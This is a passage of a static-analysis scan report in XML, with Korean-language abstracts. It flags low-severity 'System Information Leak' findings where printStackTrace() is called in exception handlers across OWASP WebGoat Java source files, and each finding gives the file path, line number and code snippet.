                        <Issue iid="94544F7344343065945982F8E21BCE4E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DatabaseUtilities.java의 makeConnection() 함수는 110 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>110</LineStart>
<Snippet>	catch (Exception e)
	{
	    e.printStackTrace();
	    return null;
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="25742E56A92040D260B30A6926B06A6C" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WsSqlInjection.java의 createContent() 함수는 219 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WsSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSqlInjection.java</FilePath>
<LineStart>219</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	return (ec);</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E8DC3D6ED853BCA5483F2920F6C6F78F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CSRF.java의 makeCurrent() 함수는 275 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>275</LineStart>
<Snippet>		{
			s.setMessage( "Error generating " + this.getClass().getName() );
			e.printStackTrace();
		}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D2CBE98F96B851D86A2DBB88FA6101B5" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 getAllEmployees() 함수는 210 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>210</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employees");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BF7CEA65EB8E52B7BA7F9689AD3E7319" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 main() 함수는 101 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>101</LineStart>
<Snippet>	catch (SQLException sqle)
	{
	    sqle.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9173282D79F380158CB220AE42554726" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ErrorScreen.java의 getStackTrace() 함수는 258 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ErrorScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ErrorScreen.java</FilePath>
<LineStart>258</LineStart>
<Snippet>		ByteArrayOutputStream bytes = new ByteArrayOutputStream();
		PrintWriter writer = new PrintWriter( bytes, true );
		t.printStackTrace( writer );

		return ( bytes.toString() );</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="58FD40089E718B766C6FA96FD22C8D81" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 getUserName() 함수는 210 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>210</LineStart>
<Snippet>			{
				s.setMessage( "Error getting user name" );
				sqle.printStackTrace();
			}
		}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8F8078791C5A9942DFCEEC021779672F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Encoding.java의 createContent() 함수는 459 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>459</LineStart>
<Snippet>			s.setMessage( "Error generating " + this.getClass().getName() );

			e.printStackTrace();

		}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2CBD712DEF62123F610AA40637D8643F" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile_BACKUP() 함수는 226 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>226</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A8A03FD3342B94A6241E845EEB5873DD" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WeakSessionID.java의 createContent() 함수는 138 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>138</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9DE7F1DA6C0A12A6FD5E01E6393AB3DA" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>BlindSqlInjection.java의 createContent() 함수는 145 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BlindSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BlindSqlInjection.java</FilePath>
<LineStart>145</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="705FAE3DBC111FD136600AFD4984E076" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>HttpBasics.java의 createContent() 함수는 78 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HttpBasics.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpBasics.java</FilePath>
<LineStart>78</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5F643FA678E744ABB5F223B467A50363" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WebSession.java의 getDatabaseConnectionString() 함수는 448 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>448</LineStart>
<Snippet>		{
			System.out.println( "Couldn't open database: check web.xml database parameters" );
			e.printStackTrace();
		}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="067B838962D6B799229870C93909DAA7" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>SilentTransactions.java의 handleRequest() 함수는 117 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SilentTransactions.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SilentTransactions.java</FilePath>
<LineStart>117</LineStart>
<Snippet>	catch (Exception ex)
	{
	    ex.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F0476D607FC7E88A788D476EA7DD55C0" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 login_BACKUP() 함수는 205 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>205</LineStart>
<Snippet>	    {
		s.setMessage("Error logging in");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="92A45ABC6BEBD81AF05D783F150A01FD" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest() 함수는 358 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>358</LineStart>
<Snippet>	    System.out.println("Authorization failure");
	    setCurrentAction(s, ERROR_ACTION);
	    ue2.printStackTrace();
	}
	catch (Exception e)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F1BE853B45C96F767817CE6D92D5FC4C" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UserAdminScreen.java의 createContent() 함수는 88 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserAdminScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/UserAdminScreen.java</FilePath>
<LineStart>88</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="578089EE6998BD5FC900CA94A6F4B9F9" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Login.java의 getAllEmployees() 함수는 216 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>216</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employees");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2509DC39A77F6D65BBCF8ACCFF657FFE" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>LessonSource.java의 doPost() 함수는 104 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonSource.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/LessonSource.java</FilePath>
<LineStart>104</LineStart>
<Snippet>	    catch (Throwable thr)
	    {
		thr.printStackTrace();
		log(request, "Could not write error screen: "
			+ thr.getMessage());</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A1F3CAB3AF6B424ADC408CBF64AACBA5" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.java의 getEmployeeProfile() 함수는 131 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>131</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D17F85CED9B5B55047EDD0446A9B17D7" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>EditProfile.java의 getEmployeeProfile() 함수는 125 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>125</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="125F01FC217C384431D1097619DF9AD9" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>BlindSqlInjection.java의 handleRequest() 함수는 344 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>BlindSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BlindSqlInjection.java</FilePath>
<LineStart>344</LineStart>
<Snippet>	{
	    System.out.println("Exception caught: " + e);
	    e.printStackTrace(System.out);
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9566BFFB8B5ACE187FB90DDCEEAC6C17" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 handleRequest() 함수는 130 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>130</LineStart>
<Snippet>	    {
		System.out.println("Internal server error");
		ue2.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8CFD6F3F11F1F76C099AC5ACA733778E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.java의 getAllEmployees() 함수는 121 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>121</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employees");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="52C8ADF9D15390304DD17CB7F9DC8B02" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DeleteProfile.java의 deleteEmployeeProfile() 함수는 120 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>120</LineStart>
<Snippet>	    {
		s.setMessage("Error deleting employee profile");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3C5D38A41A6EB2D7820B964AB70ED332" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile_BACKUP() 함수는 206 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>206</LineStart>
<Snippet>	{
	    s.setMessage("Error getting employee profile");
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9BCB204A4306E1E6CB007BE7A2EE0467" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WSDLScanning.java의 accessWGService() 함수는 163 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>163</LineStart>
<Snippet>	catch (Exception e)
	{
	    e.printStackTrace();
	}
	return null;</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3BF075B4B198A249D1BAC3FEB3984E40" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>StoredXss.java의 makeCurrent() 함수는 274 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>274</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="10D794BC1E42F40B8C7789FAB6124876" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DefaultLessonAction.java의 isAuthorized() 함수는 272 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>272</LineStart>
<Snippet>			{
				s.setMessage( "Error authorizing" );
				sqle.printStackTrace();
			}
		}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E0A0EB22F4A6987698B4EBD02907B826" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DeleteProfile.java의 deleteEmployeeProfile_BACKUP() 함수는 155 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>155</LineStart>
<Snippet>	{
	    s.setMessage("Error deleting employee profile");
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="791A891A76696CCE5590E44AE11A9C91" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>AbstractLesson.java의 readFromURL() 함수는 1045 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>1045</LineStart>
<Snippet>	{
	    System.out.println(e);
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="181A204DA906FACB0A0455C47657CF13" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 changeEmployeeProfile() 함수는 253 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>253</LineStart>
<Snippet>	    {
		s.setMessage("Error updating employee profile");
		sqle.printStackTrace();
	    }
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DA6AE311765259AD2C01E2BC5A36B04E" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ViewProfile.java의 getEmployeeProfile() 함수는 160 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>160</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employee profile");
